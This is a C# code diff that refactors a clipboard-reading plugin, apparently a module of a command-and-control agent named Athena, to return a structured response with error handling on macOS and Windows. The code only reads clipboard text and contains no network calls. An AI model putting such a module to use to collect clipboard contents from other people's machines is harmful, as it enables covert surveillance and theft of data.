@@ -11,25 +11,52 @@ namespace Athena
 {
     public static class Plugin
     {
-        public static string Execute(Dictionary<string, object> args)
+        public static PluginResponse Execute(Dictionary<string, object> args)
         {
             //I can either include this all in one (easier but larger plugin size)
             //Or I can split them into 3 separate DLL's and handle which one to load on the "load" side
-            if(OperatingSystem.IsMacOS())
+            try
             {
-                return OsxClipboard.GetText();
+                if (OperatingSystem.IsMacOS())
+                {
+                    return new PluginResponse()
+                    {
+                        success = true,
+                        output = OsxClipboard.GetText()
+                    };
+                }
+                else if (OperatingSystem.IsWindows())
+                {
+                    return new PluginResponse()
+                    {
+                        success = true,
+                        output = WindowsClipboard.GetText()
+                    };
+                }
+                else if (OperatingSystem.IsLinux())
+                {
+                    return new PluginResponse()
+                    {
+                        success = false,
+                        output = "Not implemented on this OS yet."
+                    };
+                }
+                else
+                {
+                    return new PluginResponse()
+                    {
+                        success = false,
+                        output = "Not implemented on this OS yet."
+                    };
+                }
             }
-            else if (OperatingSystem.IsWindows())
+            catch (Exception e)
             {
-                return WindowsClipboard.GetText();
-            }
-            else if (OperatingSystem.IsLinux())
-            {
-                return "Not implemented yet.";
-            }
-            else
-            {
-                return "Not implemented yet.";
+                return new PluginResponse()
+                {
+                    success = false,
+                    output = e.Message
+                };
             }
         }
 
@@ -183,6 +210,11 @@ namespace Athena
 
             [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
             static extern IntPtr sel_registerName(string selectorName);
+        }
+        public class PluginResponse
+        {
+            public bool success { get; set; }
+            public string output { get; set; }
         }
     }
 }
